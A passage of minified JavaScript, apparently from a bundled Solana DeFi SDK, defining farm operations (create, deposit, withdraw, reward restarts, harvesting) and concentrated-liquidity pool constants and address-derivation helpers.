        farmInfo: e,
        farmKeys: n,
        lpAccount: r,
        rewardAccounts: o,
        owner: i,
        amount: s,
        userAuxiliaryLedgers: a,
      } = t,
      [u, c] = [new Xi(e.programId), new Xi(e.id)],
      l = EC({ programId: u, poolId: c, owner: i, version: 3 }),
      d = ct.alloc(gC.span);
    gC.encode({ instruction: 11, amount: bI(s) }, d);
    let f = [
      PI({ pubkey: c }),
      PI({ pubkey: new Xi(n.authority), isWritable: !1 }),
      PI({ pubkey: l }),
      PI({ pubkey: i, isWritable: !1, isSigner: !0 }),
      PI({ pubkey: r }),
      PI({ pubkey: new Xi(n.lpVault) }),
      PI({ pubkey: o[0] }),
      PI({ pubkey: new Xi(n.rewardInfos[0].vault) }),
      PI({ pubkey: ks, isWritable: !1 }),
      PI({ pubkey: _c, isWritable: !1 }),
    ];
    if (a) for (let h of a) f.push(PI({ pubkey: h }));
    return new ws({ programId: u, keys: f, data: d });
  }
  ({
    voterStakeRegistryCreateVoter: ct.from([6, 24, 245, 52, 243, 255, 148, 25]),
    voterStakeRegistryCreateDepositEntry: ct.from([
      185, 131, 167, 186, 159, 125, 19, 67,
    ]),
    voterStakeRegistryDeposit: ct.from([242, 35, 198, 137, 82, 225, 242, 182]),
    voterStakeRegistryWithdraw: ct.from([183, 18, 70, 156, 148, 109, 161, 34]),
    voterStakeRegistryUpdateVoterWeightRecord: ct.from([
      45, 185, 3, 36, 109, 190, 115, 169,
    ]),
  });
  var WC = class extends iT {
      async _getUserRewardInfo({ payer: t, rewardInfo: e }) {
        if (e.mint.equals(KI)) {
          let n = await $T({
            connection: this.scope.connection,
            owner: this.scope.ownerPubKey,
            payer: t,
            amount: PC(
              AA(vA({}, e), {
                openTime: e.openTime.toString(),
                endTime: e.endTime.toString(),
              })
            ),
          });
          return { rewardPubKey: n.addresses.newAccount, newInstruction: n };
        }
        return {
          rewardPubKey: await this.scope.account.getCreatedTokenAccount({
            mint: e.mint,
            associatedOnly: !1,
          }),
        };
      }
      async create({
        poolInfo: t,
        rewardInfos: e,
        payer: n,
        programId: r = y_,
        txVersion: o,
        feePayer: i,
      }) {
        this.checkDisabled(), this.scope.checkOwner();
        let s = {
            lpMint: new Xi(t.lpMint.address),
            lockInfo: { lockMint: vC, lockVault: AC },
            rewardInfos: e,
            programId: r,
          },
          a = this.createTxBuilder(i),
          u = null != n ? n : this.scope.ownerPubKey,
          c = ZT({ fromPublicKey: u, programId: s.programId }),
          l = await this.scope.connection.getMinimumBalanceForRentExemption(
            aC.span
          );
        a.addInstruction({
          instructions: [
            Fs.createAccountWithSeed({
              fromPubkey: u,
              basePubkey: u,
              seed: c.seed,
              newAccountPubkey: c.publicKey,
              lamports: l,
              space: aC.span,
              programId: s.programId,
            }),
          ],
        });
        let { publicKey: d, nonce: f } = (({ programId: t, poolId: e }) =>
            u_([e.toBuffer()], t))({
            programId: new Xi(s.programId),
            poolId: c.publicKey,
          }),
          h = BC({
            programId: s.programId,
            poolId: c.publicKey,
            mint: s.lpMint,
            type: "lpVault",
          }),
          p = [],
          m = [];
        for (let v of s.rewardInfos) {
          v.openTime >= v.endTime &&
            this.logAndCreateError(
              "start time error",
              "rewardInfo.rewardOpenTime",
              v.openTime.toString()
            ),
            isNaN(_C[v.rewardType]) &&
              this.logAndCreateError("rewardType error", v.rewardType),
            Number(v.perSecond) <= 0 &&
              this.logAndCreateError("rewardPerSecond error", v.perSecond),
            p.push(xC(v));
          let { rewardPubKey: t, newInstruction: e } =
            await this._getUserRewardInfo({ rewardInfo: v, payer: u });
          e && a.addInstruction(e),
            t ||
              this.logAndCreateError(
                "cannot found target token accounts",
                this.scope.account.tokenAccounts
              );
          let n = v.mint.equals(KI) ? new Xi(xI.address) : v.mint;
          m.push({
            rewardMint: n,
            rewardVault: BC({
              programId: s.programId,
              poolId: c.publicKey,
              mint: n,
              type: "rewardVault",
            }),
            userRewardToken: t,
          });
        }
        let { account: g, instructionParams: y } =
          await this.scope.account.getOrCreateTokenAccount({
            mint: new Xi(s.lockInfo.lockMint),
            owner: this.scope.ownerPubKey,
            skipCloseAccount: !1,
            createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
            associatedOnly: !1,
          });
        y && a.addInstruction(y),
          g ||
            this.logAndCreateError(
              "cannot found lock vault",
              "tokenAccounts",
              this.scope.account.tokenAccounts
            );
        let { instruction: w, instructionType: b } = (function (t) {
          var e;
          let n = ct.alloc(cC.span);
          cC.encode(
            {
              instruction: 0,
              nonce: new Zn(t.nonce),
              rewardTimeInfo: t.rewardInfoConfig,
            },
            n
          );
          let r = [
            ...RI,
            PI({ pubkey: t.farmId }),
            PI({ pubkey: t.farmAuthority, isWritable: !1 }),
            PI({ pubkey: t.lpVault }),
            PI({ pubkey: t.lpMint, isWritable: !1 }),
            PI({ pubkey: t.lockVault }),
            PI({ pubkey: t.lockMint, isWritable: !1 }),
            PI({ pubkey: null != (e = t.lockUserAccount) ? e : KI }),
            PI({ pubkey: t.owner, isWritable: !1, isSigner: !0 }),
          ];
          for (let o of t.rewardInfo)
            r.push(
              PI({ pubkey: o.rewardMint, isWritable: !1 }),
              PI({ pubkey: o.rewardVault }),
              PI({ pubkey: o.userRewardToken })
            );
          return {
            instruction: new ws({ programId: t.programId, keys: r, data: n }),
            instructionType: GS,
          };
        })({
          farmId: c.publicKey,
          owner: this.scope.ownerPubKey,
          farmAuthority: d,
          lpVault: h,
          lpMint: s.lpMint,
          lockVault: s.lockInfo.lockVault,
          lockMint: s.lockInfo.lockMint,
          lockUserAccount: g,
          programId: s.programId,
          rewardInfo: m,
          rewardInfoConfig: p,
          nonce: f,
        });
        return a
          .addInstruction({ instructions: [w], instructionTypes: [b] })
          .versionBuild({
            txVersion: o,
            extInfo: {
              farmId: c.publicKey,
              farmAuthority: d,
              lpVault: h,
              lockUserAccount: g,
              nonce: f,
            },
          });
      }
      async restartReward({
        farmInfo: t,
        payer: e,
        newRewardInfo: n,
        txVersion: r,
        feePayer: o,
      }) {
        var i;
        let s = TC[t.programId];
        6 !== s && this.logAndCreateError("invalid farm version ", s);
        let a = YI((await this.scope.api.fetchFarmKeysById({ ids: t.id }))[0]),
          u = {
            id: a.id,
            rewardInfos: t.rewardInfos,
            lpVault: a.lpVault,
            programId: a.programId,
          };
        n.openTime >= n.endTime &&
          this.logAndCreateError("start time error", "newRewardInfo", n);
        let c = e || this.scope.ownerPubKey,
          l = n.mint.equals(KI) ? new Xi(xI.address) : n.mint,
          d = u.rewardInfos.findIndex((t) => new Xi(t.mint.address).equals(l)),
          f = a.rewardInfos[d];
        f ||
          this.logAndCreateError(
            "configuration does not exist",
            "rewardMint",
            l
          );
        let h = null != (i = f.vault) ? i : KI,
          p = this.createTxBuilder(o),
          { rewardPubKey: m, newInstruction: g } =
            await this._getUserRewardInfo({ rewardInfo: n, payer: c });
        return (
          g && p.addInstruction(g),
          m ||
            this.logAndCreateError(
              "cannot found target token accounts",
              this.scope.account.tokenAccounts
            ),
          p
            .addInstruction({
              instructions: [
                LC({
                  payer: this.scope.ownerPubKey,
                  rewardVault: h,
                  userRewardTokenPub: m,
                  farmKeys: u,
                  rewardInfo: n,
                }),
              ],
              instructionTypes: [VS],
            })
            .versionBuild({ txVersion: r })
        );
      }
      async restartRewards({
        farmInfo: t,
        payer: e,
        newRewardInfos: n,
        txVersion: r,
        feePayer: o,
      }) {
        var i;
        let s = TC[t.programId];
        6 !== s && this.logAndCreateError("invalid farm version ", s);
        let a = YI((await this.scope.api.fetchFarmKeysById({ ids: t.id }))[0]),
          u = {
            id: a.id,
            rewardInfos: t.rewardInfos,
            lpVault: a.lpVault,
            programId: a.programId,
          };
        n.forEach((t) => {
          t.openTime >= t.endTime &&
            this.logAndCreateError("start time error", "newRewardInfo", t);
        });
        let c = e || this.scope.ownerPubKey,
          l = this.createTxBuilder(o);
        for (let d of n) {
          let t = d.mint.equals(KI) ? new Xi(xI.address) : d.mint,
            e = u.rewardInfos.findIndex((e) =>
              new Xi(e.mint.address).equals(t)
            ),
            n = a.rewardInfos[e];
          n ||
            this.logAndCreateError(
              "configuration does not exist",
              "rewardMint",
              t
            );
          let r = null != (i = n.vault) ? i : KI,
            { rewardPubKey: o, newInstruction: s } =
              await this._getUserRewardInfo({ rewardInfo: d, payer: c });
          s && l.addInstruction(s),
            o ||
              this.logAndCreateError(
                "cannot found target token accounts",
                this.scope.account.tokenAccounts
              );
          let f = LC({
            payer: this.scope.ownerPubKey,
            rewardVault: r,
            userRewardTokenPub: o,
            farmKeys: u,
            rewardInfo: d,
          });
          l.addInstruction({ instructions: [f], instructionTypes: [VS] });
        }
        return l.versionBuild({ txVersion: r });
      }
      async addNewRewardToken(t) {
        let {
            txVersion: e,
            farmInfo: n,
            newRewardInfo: r,
            payer: o,
            feePayer: i,
          } = t,
          s = TC[n.programId];
        6 !== s && this.logAndCreateError("invalid farm version ", s);
        let a = YI((await this.scope.api.fetchFarmKeysById({ ids: n.id }))[0]),
          u = null != o ? o : this.scope.ownerPubKey,
          c = this.createTxBuilder(i),
          l = r.mint.equals(KI) ? new Xi(xI.address) : r.mint,
          d = BC({
            programId: new Xi(n.programId),
            poolId: new Xi(n.id),
            mint: l,
            type: "rewardVault",
          }),
          { rewardPubKey: f, newInstruction: h } =
            await this._getUserRewardInfo({ rewardInfo: r, payer: u });
        return (
          h && c.addInstruction(h),
          f ||
            this.logAndCreateError(
              "annot found target token accounts",
              this.scope.account.tokenAccounts
            ),
          (r.mint = l),
          c
            .addInstruction({
              instructions: [
                NC({
                  payer: this.scope.ownerPubKey,
                  userRewardTokenPub: f,
                  farmKeys: a,
                  rewardVault: d,
                  rewardInfo: r,
                }),
              ],
              instructionTypes: [HS],
            })
            .versionBuild({ txVersion: e })
        );
      }
      async addNewRewardsToken(t) {
        let {
            txVersion: e,
            farmInfo: n,
            newRewardInfos: r,
            payer: o,
            feePayer: i,
          } = t,
          s = TC[n.programId];
        6 !== s && this.logAndCreateError("invalid farm version ", s);
        let a = YI((await this.scope.api.fetchFarmKeysById({ ids: n.id }))[0]),
          u = null != o ? o : this.scope.ownerPubKey,
          c = this.createTxBuilder(i);
        for (let l of r) {
          let t = l.mint.equals(KI) ? new Xi(xI.address) : l.mint,
            e = BC({
              programId: new Xi(n.programId),
              poolId: new Xi(n.id),
              mint: t,
              type: "rewardVault",
            }),
            { rewardPubKey: r, newInstruction: o } =
              await this._getUserRewardInfo({ rewardInfo: l, payer: u });
          o && c.addInstruction(o),
            r ||
              this.logAndCreateError(
                "cannot found target token accounts",
                this.scope.account.tokenAccounts
              );
          let i = NC({
            payer: this.scope.ownerPubKey,
            userRewardTokenPub: r,
            farmKeys: a,
            rewardVault: e,
            rewardInfo: AA(vA({}, l), { mint: t }),
          });
          c.addInstruction({ instructions: [i], instructionTypes: [HS] });
        }
        return c.versionBuild({ txVersion: e });
      }
      async deposit(t) {
        let {
          txVersion: e,
          farmInfo: n,
          amount: r,
          feePayer: o,
          useSOLBalance: i,
          associatedOnly: s = !0,
          checkCreateATAOwner: a = !1,
          userAuxiliaryLedgers: u,
          computeBudgetConfig: c,
          txTipConfig: l,
        } = t;
        !1 === this.scope.availability.addFarm &&
          this.logAndCreateError(
            "farm deposit feature disabled in your region"
          );
        let { rewardInfos: d, programId: f } = n,
          h = TC[f];
        4 === h &&
          this.logAndCreateError("V4 has suspended deposits:", n.programId),
          IC(h) || this.logAndCreateError("invalid farm program:", n.programId);
        let [p, m] = [new Xi(n.programId), new Xi(n.id)],
          g = (await this.scope.api.fetchFarmKeysById({ ids: n.id }))[0],
          y = EC({
            programId: p,
            poolId: m,
            owner: this.scope.ownerPubKey,
            version: h,
          }),
          w = this.createTxBuilder(o);
        w.addCustomComputeBudget(c), w.addTipInstruction(l);
        let b = {};
        for (let B of this.scope.account.tokenAccounts)
          if (s) {
            let t = h_(this.scope.ownerPubKey, B.mint, B.programId).publicKey;
            B.publicKey &&
              t.equals(B.publicKey) &&
              (b[B.mint.toString()] = B.publicKey);
          } else b[B.mint.toString()] = B.publicKey;
        let v = b[g.lpMint.address];
        v || this.logAndCreateError("you don't have any lp", "lp zero", b);
        let A = [];
        for (let B of d) {
          let t = i && B.mint.address === zI.toString(),
            e = b[B.mint.address];
          if (!e) {
            let { account: n, instructionParams: r } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: B.mint.programId,
                mint: new Xi(B.mint.address),
                notUseTokenAccount: t,
                createInfo: { payer: o || this.scope.ownerPubKey, amount: 0 },
                owner: this.scope.ownerPubKey,
                skipCloseAccount: !t,
                associatedOnly: !t && s,
                checkCreateATAOwner: a,
              });
            (e = n), r && w.addInstruction(r);
          }
          (b[B.mint.address] = e), A.push(e);
        }
        let k,
          I = await this.scope.connection.getAccountInfo(y);
        if (
          (I && (k = RC(h).decode(I.data)), n.programId !== y_.toString() && !k)
        ) {
          let { instruction: t, instructionType: e } = MC({
            id: m,
            programId: p,
            version: h,
            ledger: y,
            owner: this.scope.ownerPubKey,
          });
          w.addInstruction({ instructions: [t], instructionTypes: [e] });
        }
        let S = SC({
          version: h,
          rewardInfos: d,
          rewardTokenAccountsPublicKeys: A,
        });
        S && this.logAndCreateError(S);
        let _ = {
            amount: bI(r),
            owner: this.scope.ownerPubKey,
            farmInfo: n,
            farmKeys: g,
            lpAccount: v,
            rewardAccounts: A,
            userAuxiliaryLedgers: null == u ? void 0 : u.map((t) => new Xi(t)),
          },
          T =
            6 === h
              ? (function (t) {
                  let {
                      farmInfo: e,
                      farmKeys: n,
                      lpAccount: r,
                      rewardAccounts: o,
                      owner: i,
                      amount: s,
                    } = t,
                    [a, u] = [new Xi(e.programId), new Xi(e.id)],
                    c = EC({ programId: a, poolId: u, owner: i, version: 6 }),
                    l = ct.alloc(gC.span);
                  gC.encode({ instruction: 1, amount: bI(s) }, l);
                  let d = [
                    PI({ pubkey: _c, isWritable: !1 }),
                    PI({ pubkey: Fs.programId, isWritable: !1 }),
                    PI({ pubkey: u }),
                    PI({ pubkey: new Xi(n.authority), isWritable: !1 }),
                    PI({ pubkey: new Xi(n.lpVault) }),
                    PI({ pubkey: c }),
                    PI({ pubkey: i, isWritable: !1, isSigner: !0 }),
                    PI({ pubkey: r }),
                  ];
                  for (let f = 0; f < n.rewardInfos.length; f++)
                    d.push(PI({ pubkey: new Xi(n.rewardInfos[f].vault) })),
                      d.push(PI({ pubkey: o[f] }));
                  return new ws({ programId: a, keys: d, data: l });
                })(_)
              : 5 === h
              ? (function (t) {
                  let {
                      farmInfo: e,
                      farmKeys: n,
                      lpAccount: r,
                      rewardAccounts: o,
                      owner: i,
                      amount: s,
                      userAuxiliaryLedgers: a,
                    } = t,
                    [u, c] = [new Xi(e.programId), new Xi(e.id)],
                    l = EC({ programId: u, poolId: c, owner: i, version: 5 }),
                    d = ct.alloc(gC.span);
                  gC.encode({ instruction: 11, amount: bI(s) }, d);
                  let f = [
                    PI({ pubkey: c }),
                    PI({ pubkey: new Xi(n.authority), isWritable: !1 }),
                    PI({ pubkey: l }),
                    PI({ pubkey: i, isWritable: !1, isSigner: !0 }),
                    PI({ pubkey: r }),
                    PI({ pubkey: new Xi(n.lpVault) }),
                    PI({ pubkey: o[0] }),
                    PI({ pubkey: new Xi(n.rewardInfos[0].vault) }),
                    PI({ pubkey: ks, isWritable: !1 }),
                    PI({ pubkey: _c, isWritable: !1 }),
                  ];
                  for (let h = 1; h < n.rewardInfos.length; h++)
                    f.push(PI({ pubkey: o[h] })),
                      f.push(PI({ pubkey: new Xi(n.rewardInfos[h].vault) }));
                  if (a) for (let h of a) f.push(PI({ pubkey: h }));
                  return new ws({ programId: u, keys: f, data: d });
                })(_)
              : (function (t) {
                  let {
                      farmInfo: e,
                      farmKeys: n,
                      lpAccount: r,
                      rewardAccounts: o,
                      owner: i,
                      amount: s,
                      userAuxiliaryLedgers: a,
                    } = t,
                    [u, c] = [new Xi(e.programId), new Xi(e.id)],
                    l = EC({ programId: u, poolId: c, owner: i, version: 3 }),
                    d = ct.alloc(gC.span);
                  gC.encode({ instruction: 10, amount: bI(s) }, d);
                  let f = [
                    PI({ pubkey: c }),
                    PI({ pubkey: new Xi(n.authority), isWritable: !1 }),
                    PI({ pubkey: l }),
                    PI({ pubkey: i, isWritable: !1, isSigner: !0 }),
                    PI({ pubkey: r }),
                    PI({ pubkey: new Xi(n.lpVault) }),
                    PI({ pubkey: o[0] }),
                    PI({ pubkey: new Xi(n.rewardInfos[0].vault) }),
                    PI({ pubkey: ks, isWritable: !1 }),
                    PI({ pubkey: _c, isWritable: !1 }),
                  ];
                  if (a) for (let h of a) f.push(PI({ pubkey: h }));
                  return new ws({ programId: u, keys: f, data: d });
                })(_),
          C = { 3: DS, 5: zS, 6: FS };
        return w
          .addInstruction({ instructions: [T], instructionTypes: [C[h]] })
          .versionBuild({ txVersion: e });
      }
      async withdraw(t) {
        let {
            txVersion: e,
            farmInfo: n,
            amount: r,
            deposited: o,
            useSOLBalance: i,
            feePayer: s,
            associatedOnly: a = !0,
            checkCreateATAOwner: u = !1,
            userAuxiliaryLedgers: c,
            computeBudgetConfig: l,
            txTipConfig: d,
          } = t,
          { rewardInfos: f } = n;
        !1 === this.scope.availability.removeFarm &&
          this.logAndCreateError(
            "farm withdraw feature disabled in your region"
          );
        let h = TC[n.programId];
        IC(h) || this.logAndCreateError("invalid farm program:", n.programId);
        let p = (await this.scope.api.fetchFarmKeysById({ ids: n.id }))[0],
          m = this.createTxBuilder(s);
        m.addCustomComputeBudget(l), m.addTipInstruction(d);
        let g = {};
        for (let _ of this.scope.account.tokenAccounts)
          if (a) {
            let t = h_(this.scope.ownerPubKey, _.mint).publicKey;
            _.publicKey &&
              t.equals(_.publicKey) &&
              (g[_.mint.toString()] = _.publicKey);
          } else g[_.mint.toString()] = _.publicKey;
        if (4 !== h) {
          let t = EC({
              programId: new Xi(n.programId),
              poolId: new Xi(n.id),
              owner: this.scope.ownerPubKey,
              version: h,
            }),
            e = await this.scope.connection.getAccountInfo(t);
          if (e)
            RC(h).decode(e.data).deposited.isZero() &&
              this.logAndCreateError("no deposited lp", { farmId: n.id });
          else if (6 !== h) {
            let { instruction: e, instructionType: n } = MC({
              id: new Xi(p.id),
              programId: new Xi(p.programId),
              version: h,
              ledger: t,
              owner: this.scope.ownerPubKey,
            });
            m.addInstruction({ instructions: [e], instructionTypes: [n] });
          }
        }
        o &&
          o.isZero() &&
          !(c || []).length &&
          this.logAndCreateError("no deposited lp", { farmId: n.id });
        let y = p.lpMint.address,
          w = i && y === zI.toString(),
          b = g[y.toString()];
        if (!b) {
          let { account: t, instructionParams: e } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: p.lpMint.programId,
              mint: new Xi(y),
              notUseTokenAccount: w,
              createInfo: { payer: s || this.scope.ownerPubKey, amount: 0 },
              owner: this.scope.ownerPubKey,
              skipCloseAccount: !0,
              associatedOnly: !w && a,
              checkCreateATAOwner: u,
            });
          (b = t), e && m.addInstruction(e);
        }
        g[y.toString()] = b;
        let v = [];
        for (let _ of f) {
          let t = i && _.mint.address === zI.toString(),
            e = g[_.mint.address];
          if (!e) {
            let { account: n, instructionParams: r } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: _.mint.programId,
                mint: new Xi(_.mint.address),
                notUseTokenAccount: t,
                createInfo: { payer: s || this.scope.ownerPubKey, amount: 0 },
                owner: this.scope.ownerPubKey,
                skipCloseAccount: !t,
                associatedOnly: !t && a,
                checkCreateATAOwner: u,
              });
            (e = n), r && m.addInstruction(r);
          }
          (g[_.mint.address] = e), v.push(e);
        }
        let A = SC({
          version: h,
          rewardInfos: f,
          rewardTokenAccountsPublicKeys: v,
        });
        A && this.logAndCreateError(A);
        let k = {
            amount: bI(r),
            owner: this.scope.ownerPubKey,
            farmInfo: n,
            farmKeys: p,
            lpAccount: b,
            rewardAccounts: v,
            userAuxiliaryLedgers: null == c ? void 0 : c.map((t) => new Xi(t)),
          },
          I =
            6 === h
              ? DC(k)
              : 5 === h
              ? UC(k)
              : 4 === h
              ? (function (t) {
                  let {
                      farmInfo: e,
                      farmKeys: n,
                      lpAccount: r,
                      rewardAccounts: o,
                      owner: i,
                      amount: s,
                      userAuxiliaryLedgers: a,
                    } = t,
                    [u, c] = [new Xi(e.programId), new Xi(e.id)],
                    l = VT([MT("instruction"), NT("amount")]),
                    d = [
                      PI({ pubkey: c }),
                      PI({ pubkey: new Xi(n.authority), isWritable: !1 }),
                      PI({ pubkey: a[0] }),
                      PI({ pubkey: i, isSigner: !0, isWritable: !1 }),
                      PI({ pubkey: r }),
                      PI({ pubkey: new Xi(n.lpVault) }),
                      PI({ pubkey: o[0] }),
                      PI({ pubkey: new Xi(n.rewardInfos[0].vault) }),
                      PI({ pubkey: ks, isWritable: !1 }),
                      PI({ pubkey: _c, isWritable: !1 }),
                      PI({ pubkey: o[1] }),
                      PI({ pubkey: new Xi(n.rewardInfos[1].vault) }),
                    ],
                    f = ct.alloc(l.span);
                  return (
                    l.encode({ instruction: 2, amount: s }, f),
                    new ws({ keys: d, programId: u, data: f })
                  );
                })(k)
              : qC(k),
          S = { 3: US, 4: WS, 5: KS, 6: jS };
        return m
          .addInstruction({ instructions: [I], instructionTypes: [S[h]] })
          .versionBuild({ txVersion: e });
      }
      async withdrawFarmReward({
        farmInfo: t,
        withdrawMint: e,
        txVersion: n,
        computeBudgetConfig: r,
        txTipConfig: o,
        feePayer: i,
      }) {
        var s;
        this.scope.checkOwner();
        let a = YI((await this.scope.api.fetchFarmKeysById({ ids: t.id }))[0]),
          u = TC[t.programId];
        6 !== u && this.logAndCreateError("invalid farm version", u);
        let c = a.rewardInfos.find((t) => FI(t.mint.address).equals(FI(e)));
        c || this.logAndCreateError("withdraw mint error", "rewardInfos", t);
        let l,
          d = null != (s = null == c ? void 0 : c.vault) ? s : KI,
          f = this.createTxBuilder(i);
        if (e.equals(KI) || e.equals(Xi.default)) {
          let t = await $T({
            connection: this.scope.connection,
            owner: this.scope.ownerPubKey,
            payer: this.scope.ownerPubKey,
            amount: PC(
              AA(vA({}, c), {
                openTime: c.openTime,
                endTime: c.endTime,
                perSecond: new mI(c.perSecond)
                  .mul(10 ** c.mint.decimals)
                  .toString(),
              })
            ),
          });
          (l = t.addresses.newAccount), f.addInstruction(t);
        } else {
          let t = await this.scope.account.getCreatedTokenAccount({ mint: e });
          null === t
            ? ((l = await this.scope.account.getAssociatedTokenAccount(e)),
              f.addInstruction({
                instructions: [
                  wl(this.scope.ownerPubKey, l, this.scope.ownerPubKey, e),
                ],
                instructionTypes: [dS],
              }))
            : (l = t);
        }
        let { instruction: h, instructionType: p } = (function (t) {
          let e = ct.alloc(nC.span);
          nC.encode({ instruction: 5 }, e);
          let n = [
            PI({ pubkey: _c, isWritable: !1 }),
            PI({ pubkey: t.id }),
            PI({ pubkey: t.authority, isWritable: !1 }),
            PI({ pubkey: t.lpVault, isWritable: !1 }),
            PI({ pubkey: t.rewardVault }),
            PI({ pubkey: t.userRewardToken }),
            PI({ pubkey: t.owner, isWritable: !1, isSigner: !0 }),
          ];
          return {
            instruction: new ws({ programId: t.programId, keys: n, data: e }),
            instructionType: XS,
          };
        })({
          programId: a.programId,
          id: a.id,
          authority: a.authority,
          lpVault: a.lpVault,
          rewardVault: d,
          userRewardToken: l,
          owner: this.scope.ownerPubKey,
        });
        return (
          f.addCustomComputeBudget(r),
          f.addTipInstruction(o),
          f
            .addInstruction({ instructions: [h], instructionTypes: [p] })
            .versionBuild({ txVersion: n })
        );
      }
      async harvestAllRewards(t) {
        let {
            farmInfoList: e,
            useSOLBalance: n,
            feePayer: r,
            associatedOnly: o = !0,
            checkCreateATAOwner: i = !1,
            userAuxiliaryLedgers: s,
            txVersion: a,
            computeBudgetConfig: u,
          } = t,
          c = this.createTxBuilder(r),
          l = {};
        for (let f of this.scope.account.tokenAccounts)
          if (o) {
            let t = h_(this.scope.ownerPubKey, f.mint).publicKey;
            f.publicKey &&
              t.equals(f.publicKey) &&
              (l[f.mint.toString()] = f.publicKey);
          } else l[f.mint.toString()] = f.publicKey;
        let d = (
          await this.scope.api.fetchFarmKeysById({
            ids: Object.values(e)
              .map((t) => t.id)
              .join(","),
          })
        ).reduce((t, e) => AA(vA({}, t), { [e.id]: e }), {});
        for (let f of Object.values(e)) {
          let { programId: t, lpMint: e, rewardInfos: a, id: u } = f,
            h = TC[t],
            p = e.address,
            m = n && p === zI.toString(),
            g = l[p];
          if (!g) {
            let { account: t, instructionParams: n } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: e.programId,
                mint: new Xi(p),
                notUseTokenAccount: m,
                createInfo: { payer: r || this.scope.ownerPubKey, amount: 0 },
                owner: this.scope.ownerPubKey,
                skipCloseAccount: !0,
                associatedOnly: !m && o,
                checkCreateATAOwner: i,
              });
            (g = t), n && c.addInstruction(n);
          }
          l[p.toString()] = g;
          let y = [];
          for (let s of a) {
            let t = n && s.mint.address === zI.toString(),
              e = l[s.mint.address];
            if (!e) {
              let { account: n, instructionParams: a } =
                await this.scope.account.getOrCreateTokenAccount({
                  tokenProgram: s.mint.programId,
                  mint: new Xi(s.mint.address),
                  notUseTokenAccount: t,
                  createInfo: { payer: r || this.scope.ownerPubKey, amount: 0 },
                  owner: this.scope.ownerPubKey,
                  skipCloseAccount: !t,
                  associatedOnly: !t && o,
                  checkCreateATAOwner: i,
                });
              (e = n), a && c.addInstruction(a);
            }
            (l[s.mint.address] = e), y.push(e);
          }
          let w = d[u],
            b = {
              amount: QI,
              owner: this.scope.ownerPubKey,
              farmInfo: f,
              farmKeys: w,
              lpAccount: g,
              rewardAccounts: y,
              userAuxiliaryLedgers:
                null == s ? void 0 : s.map((t) => new Xi(t)),
            },
            v = 6 === h ? DC(b) : 5 === h ? UC(b) : qC(b),
            A = { 3: US, 5: KS, 6: jS };
          c.addInstruction({ instructions: [v], instructionTypes: [A[h]] });
        }
        return 1 === a
          ? c.sizeCheckBuild({ computeBudgetConfig: u })
          : c.sizeCheckBuildV0({ computeBudgetConfig: u });
      }
    },
    zC = new Zn(0),
    KC = new Zn(1),
    FC = new Zn(-1),
    jC = new Zn(1).shln(64),
    GC = new Zn(1).shln(128),
    VC = jC.sub(KC),
    HC = GC.subn(1),
    XC = -443636,
    ZC = -XC,
    JC = new Zn("4295048016"),
    YC = new Zn("79226673521066979257578248091"),
    QC = new Zn("4295048017"),
    $C = new Zn("79226673521066979257578248090"),
    tB = new Zn(10).pow(new Zn(6)),
    eB = ((t) => (
      (t[(t.rate_500 = 500)] = "rate_500"),
      (t[(t.rate_3000 = 3e3)] = "rate_3000"),
      (t[(t.rate_10000 = 1e4)] = "rate_10000"),
      t
    ))(eB || {}),
    nB = {
      tvl: 0,
      volumeQuote: 0,
      mintAmountA: 0,
      mintAmountB: 0,
      rewardDefaultInfos: [],
      farmUpcomingCount: 0,
      farmOngoingCount: 0,
      farmFinishedCount: 0,
      day: {
        volume: 0,
        volumeQuote: 0,
        volumeFee: 0,
        apr: 0,
        feeApr: 0,
        priceMin: 0,
        priceMax: 0,
        rewardApr: [0],
      },
      week: {
        volume: 0,
        volumeQuote: 0,
        volumeFee: 0,
        apr: 0,
        feeApr: 0,
        priceMin: 0,
        priceMax: 0,
        rewardApr: [0],
      },
      month: {
        volume: 0,
        volumeQuote: 0,
        volumeFee: 0,
        apr: 0,
        feeApr: 0,
        priceMin: 0,
        priceMax: 0,
        rewardApr: [0],
      },
      pooltype: [],
    };
  function rB(t) {
    let e = new ArrayBuffer(2);
    return new DataView(e).setUint16(0, t, !1), new Uint8Array(e);
  }
  function oB(t) {
    let e = new ArrayBuffer(4);
    return new DataView(e).setInt32(0, t, !1), new Uint8Array(e);
  }
  function iB(t, e) {
    let n = 0;
    for (let r = t - 1; r >= 0 && !e.testn(r); r--) n++;
    return n;
  }
  function sB(t, e) {
    let n = 0;
    for (let r = 0; r < t && !e.testn(r); r++) n++;
    return n;
  }
  function aB(t, e) {
    for (let n = 0; n < t; n++) if (e.testn(n)) return !1;
    return !0;
  }
  new Zn("18446744073700000000"), ct.from("amm_config", "utf8");
  var uB = ct.from("pool", "utf8"),
    cB = ct.from("pool_vault", "utf8"),
    lB = ct.from("pool_reward_vault", "utf8"),
    dB = ct.from("position", "utf8"),
    fB = ct.from("tick_array", "utf8"),
    hB = ct.from("operation", "utf8"),
    pB = ct.from("pool_tick_array_bitmap_extension", "utf8"),
    mB = ct.from("observation", "utf8");
  function gB(t, e, n) {
    return u_([cB, e.toBuffer(), n.toBuffer()], t);
  }
  function yB(t, e, n) {
    return u_([fB, e.toBuffer(), oB(n)], t);
  }
  function wB(t, e, n, r) {
    return u_([dB, e.toBuffer(), oB(n), oB(r)], t);
  }
  function bB(t, e) {
    return u_([dB, e.toBuffer()], t);
  }
  function vB(t) {
    return u_([ct.from("metadata", "utf8"), qI.toBuffer(), t.toBuffer()], qI);
  }
  function AB(t) {
    return u_([hB], t);
  }
  function kB(t, e) {
    return u_([pB, e.toBuffer()], t);
  }
  var IB = ct.from("locked_position", "utf8");
  function SB(t, e) {
    return u_([IB, e.toBuffer()], t);
  }
  function _B(t, e) {
    return u_([IB, e.toBuffer()], t);
  }
  var TB = ct.from("support_mint", "utf8");
  function CB(t, e) {
    return u_([TB, e.toBuffer()], t);
  }
  var BB = class {
      static getfeeGrowthInside(t, e, n) {
        let r = new Zn(0),
          o = new Zn(0);
        t.tickCurrent >= e.tick
          ? ((r = e.feeGrowthOutsideX64A), (o = e.feeGrowthOutsideX64B))
          : ((r = t.feeGrowthGlobalX64A.sub(e.feeGrowthOutsideX64A)),
            (o = t.feeGrowthGlobalX64B.sub(e.feeGrowthOutsideX64B)));
        let i = new Zn(0),
          s = new Zn(0);
        return (
          t.tickCurrent < n.tick
